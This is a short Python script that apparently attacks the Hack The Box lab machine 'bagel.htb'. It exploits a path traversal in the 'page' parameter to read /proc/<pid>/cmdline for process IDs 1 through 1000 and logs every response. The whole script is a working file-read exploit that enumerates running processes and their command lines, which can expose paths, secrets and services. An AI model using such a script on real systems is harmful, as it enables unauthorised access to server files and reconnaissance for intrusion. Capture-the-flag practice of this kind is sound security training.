import requests

headers = {
    'Host': 'bagel.htb:8000',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}

# Open the log file for writing
with open("log", "w") as log_file:

    # Loop through the range of process IDs
    for proc_id in range(1, 1001):

        # Construct the URL for the current process ID
        page_url = f"http://bagel.htb:8000/?page=../../../../../../../../proc/{proc_id}/cmdline"

        # Use requests to fetch the page contents
        response = requests.get(page_url, headers=headers, verify=False)

        # Write the response content to the log file
        log_file.write(f"Contents of /proc/{proc_id}/cmdline:\n{response.content.decode()}\n\n")
